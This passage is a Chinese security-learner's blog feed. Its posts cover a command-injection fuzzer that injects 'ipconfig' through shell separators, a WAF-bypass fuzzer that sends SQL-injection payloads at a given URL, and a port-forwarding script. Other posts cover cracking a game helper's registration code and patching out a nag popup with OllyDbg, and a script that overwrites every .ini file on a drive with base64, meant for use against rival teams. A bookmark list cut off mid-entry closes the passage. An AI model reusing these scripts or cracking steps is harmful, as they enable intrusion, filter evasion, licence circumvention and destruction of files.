valueurls=urlheaders={&apos;user-aegnt&apos;:&apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&apos;}payload=[&apos;|&apos;,&apos;;&apos;,&apos;||&apos;,&apos;&amp;&amp;&apos;,&apos;&amp;&apos;]payload_b=[&apos;-&apos;,&apos;$&apos;]payload_c=[&apos;-&apos;]payload_d=[&apos;$&apos;]for p in payload:    for pb in payload_b:        for pc in payload_c:            for pd in payload_d:                pf=pc+pd                datas={&apos;ip&apos;:&apos;127.0.0.1{}i{}p{}c{}o{}n{}f{}i{}g&apos;.format(p,pb,pb,pb,pb,pb,pb,pb),&apos;Submit&apos;:&apos;Submit&apos;}                datas2={&apos;ip&apos;: &apos;127.0.0.1{}i{}p{}c{}o{}n{}f{}i{}g&apos;.format(p, pf, pf, pf, pf, pf, pf, pf),&apos;Submit&apos;: &apos;Submit&apos;}                reqt=requests.post(url=urls,headers=headers,cookies=cookie,data=datas)                reqt2=requests.post(url=urls,headers=headers,cookies=cookie,data=datas2)                if &apos;Windows IP&apos; in reqt.text:                    print(&apos;[+] Bypass success URL:{} data:{}&apos;.format(reqt.url,datas))                if &apos;Windows IP&apos; in reqt2.text:                    print(&apos;[+] Bypass success URL:{} data:{}&apos;.format(reqt.url, datas))if __name__ == &apos;__main__&apos;:    main()</code></pre><p>测试：<br><img src="https://s1.ax1x.com/2018/10/05/i88M40.png" alt=""></p><p><img src="https://s1.ax1x.com/2018/10/05/i883gU.png" alt=""></p><p>转载请注明转自<a href="mailto:422926799@qq.com" target="_blank" rel="noopener">422926799@qq.com</a></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>打造端口转发脚本</title>
      <link href="/posts/e431254b.html"/>
      <url>/posts/e431254b.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前尝试在学校写端口转发工具，发现失败了。回家找了一些文章看懂了之后写了出来。时间过的真快，今天就10月3号了。。。我日。。<br><img src="https://i.imgur.com/sS4jUrL.jpg" alt=""></p><p><embed src="//music.163.com/style/swf/widget.swf?sid=425008411&type=2&auto=1&width=320&height=66" width="340" height="86" allownetworking="all"></p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><blockquote><p>在网吧通过路由器或者代理连接到外网，而在内网建立和运行网络服务器或FTP服务器是没办法使外网用户直接访问的，通过在路由上的NAT开启建立相应端口转发的映射，你可以指示路由器转发对某一特定网端口（如80 ，为网络服务器或21为FTP服务器） 所有的信息为本地网络。 这意味着，如果一个外部主机试图通过HTTP访问外网的IP加相应端口，就可访问到相应的内网建立的服务器。 外部访问此服务器的用户并不知道服务器是处于内部网络上的。 这种方法被广泛应用于网吧或通过NAT共享上网在内网建立服务器的用户。公安监控系统即通过此方法来监控网吧数据的。 转发端口，比用其它方法更安全更易用， 企业内部可能有很多专业化的服务，比如 ERP 系统，监控系统， OA 系统， CRM 等等，用户不需要移植或者更新现有的服务而单独申请专用的外部IP地址,只需要简单的配置一下网关路由的端口转发功能，即可使互联网上的用户使用这些服务。<br>端口转发一般常常用于虚拟机与宿主机之间通信时使用。最经常用的如：通过linux的ssh方式通信，本机端口转发连接VMware虚拟机。再者：VirtualBox NAT设置和端口转发等等。–《百度百科》</p></blockquote><p>实际上实现端口转发也就是：</p><pre><code>要转发的端口为A 监听的端口为B1.连接要转发端口2.监听一个端口3.A发送数据给B，B发送数据给A</code></pre><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><pre><code>import socketimport threadingserver_host=&apos;127.0.0.1&apos;server_port=4446client_host=&apos;127.0.0.1&apos;client_port=80def jianting(host,port,client_host,client_port):    try:        server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)        client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)        server.bind((host,port))        server.listen(5)        ss,addr=server.accept()        client.connect((client_host,client_port))        while True:            mg=ss.recv(5096)            client.send(mg)            buf=client.recv(5096)            ss.send(buf)    except Exception as error:        print(&apos;[-]Error {}&apos;.format(error))        exit()def run():    s=threading.Thread(target=jianting,args=(server_host,server_port,client_host,client_port))    s.start()if __name__ == &apos;__main__&apos;:run()</code></pre><p>测试结果：</p><p><img src="https://s1.ax1x.com/2018/10/03/i3GdnH.png" alt=""></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>破解QQ游戏对对碰助手</title>
      <link href="/posts/ff7908b7.html"/>
      <url>/posts/ff7908b7.html</url>
      <content type="html"><![CDATA[<p>#前言#<br>继续shark恒的教程。这里到十三课，破解了一个简单的单机游戏外挂这里 我做个记录。其实是想放录屏的，但是好模糊。。妈耶<br><img src="https://s1.ax1x.com/2018/10/02/i1ztQH.jpg" alt=""></p><p>#正文#<br>破解的常规操作</p><pre><code>1.查壳，随便查一下那种语言写的，如果PEID查不出用DELE查2.载入OD3.找关键字 4.根据程序用什么语言写的来破解5.其他方法破解6.暂停法破解7.各种API断点</code></pre><p>所以还是先查壳<br><img src="https://s1.ax1x.com/2018/10/02/i1z0TP.png" alt=""><br>VB写的，没有壳，EP段未被修改</p><p>载入OD<br><img src="https://s1.ax1x.com/2018/10/02/i1zDFf.md.png" alt=""><br>运行程序，寻找关键字<br><img src="https://s1.ax1x.com/2018/10/02/i1zrY8.md.png" alt=""></p><p><img src="https://s1.ax1x.com/2018/10/02/i1z6Sg.png" alt=""><br>寻找段首然后下断点<br><img src="https://s1.ax1x.com/2018/10/02/i1zclQ.md.png" alt=""><br>输入假码<br><img src="https://s1.ax1x.com/2018/10/02/i1zWmn.png" alt=""><br>往下单步即可找到真码</p><p>出现假码<br><img src="https://s1.ax1x.com/2018/10/02/i1zfwq.png" alt=""><br>真码<br><img src="https://s1.ax1x.com/2018/10/02/i1zhT0.png" alt=""><br>破解成功：<br><img src="https://s1.ax1x.com/2018/10/02/i1zIYT.md.png" alt=""></p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当然你也可以寻找判断注册码是否正确的关键跳进行NOP填充。这样也是可以的，这里我们可以学到：如果找不到关键跳的情况下，对段首下断点进行单步调试说不定能找到惊喜</p><embed src="//music.163.com/style/swf/widget.swf?sid=425828154&type=2&auto=1&width=320&height=66" width="340" height="86" allownetworking="all"><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>简单bypass过狗脚本</title>
      <link href="/posts/77e68261.html"/>
      <url>/posts/77e68261.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>国庆回到家，当然要搞事对不对。搞事就要嗨皮，嗨皮就是要战歌，总之很皮就对了<br>（稽不可言）<br><img src="https://s1.ax1x.com/2018/09/30/i1Zt2t.png" alt="i1Zt2t.png"></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>我这里写的是一个针对WTS-WAF的，这个脚本是思路也很简单<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.创建几个fuzz的列表然后加在一起</span><br><span class="line">2.遍历多几次和生成字典一样</span><br><span class="line">3.发送请求判断是否有关键词存在</span><br><span class="line">4.没有则成功过了</span><br></pre></td></tr></table></figure></p><p>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">start=time.time()</span><br><span class="line">xj=open(&apos;save.txt&apos;,&apos;w&apos;)</span><br><span class="line">xj.close()</span><br><span class="line">def by_pass():</span><br><span class="line">    filter_a=&apos;D盾_拦截提示&apos;</span><br><span class="line">    filter_b=&apos;浏览器安全检查中.....请稍后&apos;</span><br><span class="line">    user=input(&apos;url:&apos;)</span><br><span class="line">    url=&apos;&#123;&#125;%20&apos;.format(user.strip())</span><br><span class="line">    headers=&#123;&apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&apos;&#125;</span><br><span class="line">    Fuzz_a = [&apos;/*!&apos;, &apos;*/&apos;, &apos;/**/&apos;, &apos;/&apos;, &apos;?&apos;, &apos;~&apos;, &apos;!&apos;, &apos;.&apos;, &apos;%&apos;, &apos;-&apos;, &apos;*&apos;, &apos;+&apos;, &apos;=&apos;]</span><br><span class="line">    Fuzz_b = [&apos;&apos;]</span><br><span class="line">    Fuzz_c = [&apos;%0a&apos;, &apos;%0b&apos;, &apos;%0c&apos;, &apos;%0d&apos;, &apos;%0e&apos;, &apos;%0f&apos;, &apos;%0h&apos;, &apos;%0i&apos;, &apos;%0j&apos;]</span><br><span class="line">    fuzz=Fuzz_a+Fuzz_b+Fuzz_c</span><br><span class="line">    for a in fuzz:</span><br><span class="line">        for b in fuzz:</span><br><span class="line">            for c in fuzz:</span><br><span class="line">                payload=&apos;/*!and&apos;+a+b+c+&apos;1=2/*&apos;</span><br><span class="line">                urls=url.strip()+payload.strip()</span><br><span class="line">                try:</span><br><span class="line">                    reqt=requests.get(url=urls,headers=headers)</span><br><span class="line">                    if filter_a in reqt.content.decode(&apos;utf-8&apos;) and filter_b in reqt.content.decode(&apos;utf-8&apos;):</span><br><span class="line">                        print(&apos;[-] Over dog failure:&#123;&#125;&apos;.format(reqt.url))</span><br><span class="line">                    elif not filter_a in reqt.content.decode(&apos;utf-8&apos;) and not filter_b in reqt.content.decode(&apos;utf-8&apos;):</span><br><span class="line">                        print(&quot;[*] Pass the dog&apos;s success:&#123;&#125;&quot;.format(reqt.url))</span><br><span class="line">                        print(&quot;[*] Pass the dog&apos;s success:&#123;&#125;&quot;.format(reqt.url),file=open(&apos;save.txt&apos;,&apos;a&apos;))</span><br><span class="line">                except Exception as error:</span><br><span class="line">                    print(&apos;[-] Error: &#123;&#125;&apos;.format(error))</span><br><span class="line">by_pass()</span><br><span class="line">stop=time.time()</span><br><span class="line">print(&apos;[!]time:&#123;&#125;&apos;.format(start-stop))</span><br></pre></td></tr></table></figure></p><p>测试结果对比：<br><img src="https://s1.ax1x.com/2018/09/30/i1ZaKf.png" alt="i1ZaKf.png"><br>fuzz脚本：<br><img src="https://s1.ax1x.com/2018/09/30/i1Zdr8.md.png" alt="i1Zdr8.md.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>F12暂停法破解PE的弹窗</title>
      <link href="/posts/23ee4a5c.html"/>
      <url>/posts/23ee4a5c.html</url>
      <content type="html"><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>今天学了shark恒的第12课教程，学习到了什么是段首，段尾。F12暂停法破解。这里我做一个总结<br><img src="https://f12.baidu.com/it/u=3530457059,944842589&amp;fm=72" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>第12课拿到的课件是一个叫WebMancs.ExE的软件。这个软件可以说是矛与盾的问题，这里已经是可以无限制使用的。但是他还是要你注册，有个框框老是发神经的弹出来。这里就来把他删除掉<br><img src="https://s1.ax1x.com/2018/09/23/iusIGq.png" alt=""><br>首先查壳<br><img src="https://s1.ax1x.com/2018/09/23/iusTzV.png" alt=""><br>没壳（滑稽）<br>载入OD<br><img src="https://s1.ax1x.com/2018/09/23/iuypz6.png" alt=""><br>F9运行程序<br><img src="https://s1.ax1x.com/2018/09/23/iuyCQK.png" alt=""><br>回到OD F12暂停程序<br><img src="https://s1.ax1x.com/2018/09/23/iuyPsO.png" alt=""><br>在OD的菜单栏上点击K<br><img src="https://s1.ax1x.com/2018/09/23/iuyAdH.md.png" alt=""></p><pre><code>user32.MessageBoxExA右键单击显示调用</code></pre><p><img src="https://s1.ax1x.com/2018/09/23/iuyKQf.md.png" alt=""><br>发现一个call，代表跳出来的框框是从这个call里面出来的，按F2下断<br><img src="https://s1.ax1x.com/2018/09/23/iuyJFs.md.png" alt=""><br>然后F8单步往下走出系统领空<br><img src="https://s1.ax1x.com/2018/09/23/iuydyT.md.png" alt=""><br>走出了系统领空<br><img src="https://s1.ax1x.com/2018/09/23/iuyBmF.md.png" alt=""><br>然后我们往上面翻可以看见段首和段尾<br><img src="https://s1.ax1x.com/2018/09/23/iuyrTJ.png" alt=""><br>F8往下单步，看看有什么神奇的东西（发现并没有什么，那么出call）<br><img src="https://s1.ax1x.com/2018/09/23/iuy6YR.md.png" alt=""><br>出call之后我们发现了弹框的call还有弹出这个框框的关键跳<br><img src="https://s1.ax1x.com/2018/09/23/iuyW6K.png" alt=""><br>对jnz下断看看<br><img src="https://s1.ax1x.com/2018/09/23/iuyITH.png" alt=""></p><pre><code>成功断了下来，然后我们可以看到跳转未实现，所以老是弹出那个该死框框。点击一下z标志位，让其跳转实现并将jnz修改为jmp即可去掉该死的框框。然后保存exe，退出OD。</code></pre><p><img src="https://s1.ax1x.com/2018/09/23/iuyqpt.md.png" alt=""><br>保存的exe，点开退出后发现已经没有了框框<br><img src="https://s1.ax1x.com/2018/09/23/iuyvnS.md.png" alt=""></p><p>转载请注明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>制作一个简单的加密脚本</title>
      <link href="/posts/98528757.html"/>
      <url>/posts/98528757.html</url>
      <content type="html"><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>这个脚本的来源是因为，11月份要去东莞理工参加网络空间杯比赛。到后面的混战，得给他们一些颜色看看才行。（滑稽）<br><img src="https://tse4-mm.cn.bing.net/th?id=OIP.-uD5EZPVEsfhoV4QORfUHAAAAA&amp;w=208&amp;h=204&amp;c=7&amp;o=5&amp;pid=1.7" alt=""></p><h2 id="制作过程："><a href="#制作过程：" class="headerlink" title="制作过程："></a>制作过程：</h2><pre><code>1.我这里使用执行windows的dir命令来获取指定类型的所有文件2.然后获取路径3.打开路径里的指定文件4.进行base64加密5.写入6.后续改进......</code></pre><h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><pre><code>import osimport reimport base64def jiami():ml=[]txs=[]path=os.popen(&apos;E:&amp;&amp;cd E:&amp;&amp;dir /s *.ini&apos;) //获取E盘下的所有ini文件paths=path.read()mks=re.findall(&apos;.*?的目录&apos;,str(paths)) //获取路径pp=re.findall(&apos;[\w]*\.ini&apos;,str(paths)) //获取文件名for p in pp:    txs.append(&apos;/&apos;+p)for v in mks:    th=re.sub(&apos;的目录&apos;,&apos;&apos;,v)    tf=th.replace(&apos;\\&apos;,&apos;/&apos;).strip()    ml.append(tf)for m in ml:    for p in txs:        lj=m,p        ljs=&quot;&quot;.join(lj)        if os.path.exists(&apos;{}&apos;.format(ljs)):            dk=open(ljs,&apos;rb&apos;)            rs=dk.read()            jiami=base64.b64encode(rs)            dk.close()            dk2=open(ljs,&apos;w&apos;)            dk2.write(str(jiami))            dk2.close()            print(&apos;[+] yi ji mi {}&apos;.format(lj))jiami()</code></pre><p>测试结果：<br><img src="https://i.imgur.com/AJEas2O.jpg" alt=""><br>（未完，待下个星期去到实验室进行改进）</p><p>转载请注明：422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>转自即刻安全的收藏列表</title>
      <link href="/posts/df58c02c.html"/>
      <url>/posts/df58c02c.html</url>
      <content type="html"><![CDATA[<h4 id="Demon哥整理的收藏夹，还有我自己收藏的"><a href="#Demon哥整理的收藏夹，还有我自己收藏的" class="headerlink" title="Demon哥整理的收藏夹，还有我自己收藏的"></a>Demon哥整理的收藏夹，还有我自己收藏的</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">三个附件下载地址：链接：https://pan.baidu.com/s/1Qx1yq1XHY2ymerBdCIVRoA 密码：97gt</span><br></pre></td></tr></table></figure><p>Demon哥发的</p><html><br>  <body><br>&lt;!DOCTYPE NETSCAPE-Bookmark-file-1&gt;<br><!-- This is an automatically generated file.     It will be read and overwritten.     DO NOT EDIT! --><br><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><br><title>Bookmarks</title><br><h1>Bookmarks</h1><br><dl><p><br>    <dt><h3 add_date="1535736171" last_modified="1536300555" personal_toolbar_folder="true">书签栏</h3><br>    <dl><p><br>        <dt><h3 add_date="1535736301" last_modified="1537009690">博客</h3><br>        <dl><p><br>            <dt><a href="http://www.ggsec.cn/" add_date="1491019863" target="_blank" rel="noopener">www.ggsec.cn</a><br>            <dt><a href="http://www.secist.com/" add_date="1491021693" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADJ0lEQVQ4jV1SW2tcZRRd+5zvm5nOPZdO0kmjiZKBYUKr0RrSQuuLqATap2KggiD+Bn2pdKi+KQV9yIuI+CBFI8RIVQiWVGqoF2pqm9QmM0maDNMMk7ll7ufMOd/2YTJpdT1u9lp777UX8BgEZjr/DetxZg3/x6X1yNH56nsDH95Zix7/+GKHI55oYRBhBrBnOpXPMsND3dqZsW45eSKonzk27Dl8+ZaNUrkW6bQcCIz/lvdTjgekRrEuB50AY2LIpx9/M+r3+yTwlAASBlqlREo6G8bPbdZ5TUzd3Bu3TfWBKltDkAhfiAY8fX6BGykTbw0LsLLstYLFLr+khWRVGKlMuUe1FtsCM0pzMJ/VXd5XBPNIUMBzsptVq9awnvNZNiub59OGVjFZ37GIl9b2QLm9W4vZjzY6Z2uSVaxeqdhGq9VyECsGkUuDHg1K7cdtAxXDprKpsFpRtH77IYlSZZYABuIaAGiAihqmoRsWdLck8gjQeP8hWiu3KF2zIHWN6wq8kq5rxXuJHUe6MNceHldtExXCxZoJKYgCEuRzCtzbLOLO3V1kLZ1yLgePPHtYJZe2RWsz+1UC0xmACSBmZhKNFjsmh9zI1hUH3RKPUgX6/uYWXjw5DJUz+YeNKi8/KOmelWQmtbo03YkMABARC68EvxHxoculkdSJvptbxtj40zC3d9GTr2NQP6SuFVmcmoj+1Jie2aL96QDAzCRCHpFfr9hHvE3FO8Um/s6ZyFeZfvn8DxapXX50bISrYy+oks/rB+AEqPlkQIVX6n9e/qt6djtX5i63pNGaRcsPCqxeivJWg1Smp5d1XWphp70BwECcCfH2BgCgPRN0Xo0EBBkWc4vB5VCPqq9n1G0Z0FKvnxaN0BHHKPZWPn0t9AkBCpdwQCYiFrG6YzbfJ+fK2uC5G/e3FPUGtJef92PgbuJ+IdSbbKaz4UKq6B78ddPaZx0IMDNpsRiZRyXemezn2anRPpxyWcnm6sN3Ty8uTFz/IjYV/Hr+QsXWI75w8CpW2HHwgv0NDsyIL7D49p/mq1euXB94bFE7bf1vX3vfd/H3L/cF/oN/Adu8gL9UjXrzAAAAAElFTkSuQmCC" target="_blank" rel="noopener">即刻安全|致力于网络安全的研究学习平台</a><br>            <dt><a href="https://img.wonderhowto.com/" add_date="1491059608" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACm0lEQVQ4jV2TPYhddRTEf3Pufe9+7DMmRtQiNhJZhGAXQU00IMGghVis2oqFoAiCuBK1eKUJKQI2gmBpEQtBQZvdDUpEUIJNRMiKCIJBZEM2675337v3/sci6xr2lMOcM8NwRtw+RggDLF/kUNbXzzpS28ybr8+f4tpeDoD2guOLjGYunrB1NCNyJ5SyNAv8w7ydXTr3NNu372hXfUycfrQ6qpwTFncF2jY7SiYk1wk2oPum+Lb9cTwm3XJg9M5KdX/kOpnZiympQcwEpYXlWy4NDaYAl5bW2zytnHuy+V2nVzgo1V9iflH4Z5JGyFUS10z3XTJZrvxxmXuSNQ15gvQQpEM3m2YpbzpcD1kkeAT0PaS1Plgtaa5s/UM3rDBt+4fzhSOiP27pFPAwxF9Vi2Mn/ikoq/bpWMpUf3CiWW0nZVHWVdHPq2qYMVi/vr1mhbCOgzrZbT1AebOA61YBdmqxnLLlLxilQTMpWvpJwN9b6IEDjGSsYGpspPhzgOLeDhuMJYSk6M8+x1Yq8gfnw+rjelh/um9UHjlzkk0itUAGQjsfkN+4AfWdtiScwNa+d9eqt0FvSSoi835FPPX+an3GuDL0gjDmAJAXIyxIhPvZVAF+UZYttp08S3YJGg4qvddOuY7YTHgosGZETFpsVA4KZdgJA/IGVgkqjPJsQMwbtzuBdwEjWQtNi+PDZ7gp80o380/FApmCwmg/+LeEx4g3+54rg0IDMkqhu40v9+5fO/88m7uvvHSB4eJ91eukeDmltOLkz3v1szBW5MMQLyn0WN/x0a8bk08+e4F+t0xLF8j+A974iqJqOahReVhmCJCJ+Tyaq2tX2bj8Ki3A2MRYpP/LtOfQ8iXuiGl9OAJ1xWT97DG29nIA/gVP6Uz+OFlu/wAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Wonder How To » Fresh Hacks For a Changing World</a><br>            <dt><a href="https://null-byte.wonderhowto.com/" add_date="1491059702" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACm0lEQVQ4jV2TPYhddRTEf3Pufe9+7DMmRtQiNhJZhGAXQU00IMGghVis2oqFoAiCuBK1eKUJKQI2gmBpEQtBQZvdDUpEUIJNRMiKCIJBZEM2675337v3/sci6xr2lMOcM8NwRtw+RggDLF/kUNbXzzpS28ybr8+f4tpeDoD2guOLjGYunrB1NCNyJ5SyNAv8w7ydXTr3NNu372hXfUycfrQ6qpwTFncF2jY7SiYk1wk2oPum+Lb9cTwm3XJg9M5KdX/kOpnZiympQcwEpYXlWy4NDaYAl5bW2zytnHuy+V2nVzgo1V9iflH4Z5JGyFUS10z3XTJZrvxxmXuSNQ15gvQQpEM3m2YpbzpcD1kkeAT0PaS1Plgtaa5s/UM3rDBt+4fzhSOiP27pFPAwxF9Vi2Mn/ikoq/bpWMpUf3CiWW0nZVHWVdHPq2qYMVi/vr1mhbCOgzrZbT1AebOA61YBdmqxnLLlLxilQTMpWvpJwN9b6IEDjGSsYGpspPhzgOLeDhuMJYSk6M8+x1Yq8gfnw+rjelh/um9UHjlzkk0itUAGQjsfkN+4AfWdtiScwNa+d9eqt0FvSSoi835FPPX+an3GuDL0gjDmAJAXIyxIhPvZVAF+UZYttp08S3YJGg4qvddOuY7YTHgosGZETFpsVA4KZdgJA/IGVgkqjPJsQMwbtzuBdwEjWQtNi+PDZ7gp80o380/FApmCwmg/+LeEx4g3+54rg0IDMkqhu40v9+5fO/88m7uvvHSB4eJ91eukeDmltOLkz3v1szBW5MMQLyn0WN/x0a8bk08+e4F+t0xLF8j+A974iqJqOahReVhmCJCJ+Tyaq2tX2bj8Ki3A2MRYpP/LtOfQ8iXuiGl9OAJ1xWT97DG29nIA/gVP6Uz+OFlu/wAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Null Byte - The aspiring white-hat hacker/security awareness playground « Wonder How To</a><br>            <dt><a href="https://yeasy.gitbooks.io/docker_practice/content/install/mirror.html" add_date="1491154741" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAC1UlEQVQ4jXVSv0t0VxA9c+fu+7FvRVxU0IRECEIIErFbwQ+3EEQkiyDbWFoI4n8QSBCClnY2FsFmZUEFUwlW+TClWAQWiwUJIcgaV1DX9za+d++dFN9qSOGBYZhhfh4OLSwsfMXM/4Rh+Aige3h4aPEfuOffcpubm6rRaOSfnp76RCSgSqXSERFnrU2I6E/P835XSv1mrf3l5OTkAQAWFxcHwjD8LsuyGWPMtyLyBTNHAIgqlYoQEYIggLUWSZIgTVP4vv8XEf3onPOI6Ic0TT/zfR9BEEBrjSRJAADaGCN9fX2yu7sL55y0Wi25vLyk8/Pzz+/u7n5WSqFYLKJUKtmJiQk3NjamoihyGxsb6cPDQ14DIBGhgYEBxHEsrVYLKysrWFpasqurq845x1tbWzI6OsqvnFj7iRIiIiUiICLpdrtSq9Xo+flZ9vf3USgUoLUWIqLh4WFqNpuyvb0tp6encM6htxiKiCAipJSiKIpwe3tLURSRtZZE5M3Ozs5oZmYGV1dXuL+/Ry6Xw9sA5xyCIMD09DTq9TpKpRI8z0PvOhhjMDc3h4ODA4yMjGBoaAhZloGI8PoCnHNgZgwODr7FrwjDkPr7+3F9fY2pqSkws3LOgYig3xTDnzRjjPlfMxHJ0dGR1Ot1NTk5ifHxcRhjLDOLiEADEBFBt9uFcw5KKQnDkJRSiplNkiRUq9UwPz+PtbU1ISJ0Oh2ICACI1lpTmqZYX19HPp931lpzcXHBs7OzEBF4nic7Ozvu8fERe3t7rtlscrvd1nEc61wuB6pUKk89QXlExL7vI01TFItFdDqdTESoWCxyq9UiYwyYGURkmDkFYLS19sssywqFQmFIRMbSNP2GmT+02+1Z3/d9IsLNzU3med6vYRh+tNY2APwRx/HfIhIT3sHy8vLXLy8v3xOR53neT8fHx433aqlnqlqtcrlc1u8VlstlXa1WGYB67fsXNjxy8R1L2VcAAAAASUVORK5CYII=" target="_blank" rel="noopener">镜像加速器 · Docker —— 从入门到实践</a><br>            <dt><a href="http://www.imeetyou.net/posts/frontend/2016/hexo-node-err.html" add_date="1505124485" target="_blank" rel="noopener">重装node导致Hexo不能正常使用解决办法 | 智的前端之路</a><br>            <dt><a href="https://www.zhihu.com/question/60760387/answer/179901293" add_date="1503399978" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABV0lEQVQ4jWPkantxhIWJ2ZqBDPDn39+jTMianSVZSDKAhYnZmgnGUedlYlgXJ8AQIM9KmiEwRrQOO8O/f/8ZFoTzwSUZGRkZJLrfMLwoFcHQyN/5Bs0AI06GvA2fGdbe+8XwvEQEroAT6kaxbgifjYmB4UkxwkC4AV6LPjC8+P6P4fc/CJ+VkYHh93+EjT//EfDCzc+oKpA1I4N/aOJwA04lCDCoiyNi4WM5xJkSUKczMUI0/8XlArMFH1A0o4cBLoAhXaDPzsDAwMCQq8uOIs6MwwsYBjR68DKsu/idocWLlyFZkx1dGr8LAhVYGf7++8+QuOMrQ+DCDwx9frxwud//IV6DhQ0MoKTdBeH8DAtOfWdgYGBg2PfiD0P6mk8M3/8xMAh2vUEJF2TAyNfx+j8DAwPDKj9ehnVXfzKsuPsLu1MZMf2PYgC5gOnPv79HydX859/fowD6kXNStdV4NAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">如何解决Linux内核头文件和内核版本不同的问题？ - 知乎</a><br>            <dt><a href="https://www.corelan.be/index.php/security/metasploit/" add_date="1492327757" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACm0lEQVQ4jY2TW0jTYRjGn+//38G5/9Spqa0MbFNhKyOxWnnTTeSFSOsuCgoiNCIKSdASRBPMCCE7EV0JBRLetEzBPCAoap7w0HIeyszN1jYz3Ybu9HaRE6tpvTcfvDy/B973fT4eW1R2drzi6vlA/tFMqDt7yQwguJU2TOkkj6vl162josWJTjZXfoM3AGD/hWo0Gun9CqFgtl/koCUQOUADzWymOF+UA4D7B35cVFOuuGjuFn0lB4jmQWQBkQ3UbWSmCwac2I7maytx5tM7WGlxHQ4ZWH+ZtL1kY2fzkP0btP5y1aXCKX1W0t3YHarkKNkqEOEFJBK4V9WQyCIB3oWUZJYQH8vt93poZGwSlpABV1YYlZN30luj0ybtHTYp0dqtxEEt4U1rJsbNaZj6nAq7PR2M24P01OVdgtytXbBgcNYCG4quKHNHOqQfyMmIHCByRNNpwwESFDsJEBMAAjjSadOo7skxImcckQ3U9IK16DNwhIPfGxvw+QXwBHgZEOOBIHPBteIE4FufMIj3phk8rfPA55EAEkAeCWViAmJETV3uekHgGcexO7p96iRTnxS7VXHobyc0vlXANJUClzuIdI0C+eeCEMvn0dXBzEYjf/NVq789tExxVTEK2hrU3yZ69PTjYyLRGohWlOSx6Gl14RCRXUXkiKa+Rn6q6BJy/wqWTgfJvVJcm+7Fd1r+44QLIFoEDbXgy60C3rA5UKEzwm5HYHIOI9GRXFApICtehYiNFYiBwQFmbWzmSyoeBhqw6V9sGADA0hL8kNIw5+NYQhwOK1WQgAfGx5j9tZErKasN1APwb5dGAEBGIuQPKrkqyyjzTPcwx+1C7jIAUTgtH65pc8MnSGnU6eRkQ+PU8ug5PXO7sRZO+xPebi2MwfPKlgAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Metasploit | Corelan团队</a><br>            <dt><a href="http://blog.csdn.net/u010472499/article/details/52994454" add_date="1491159510" 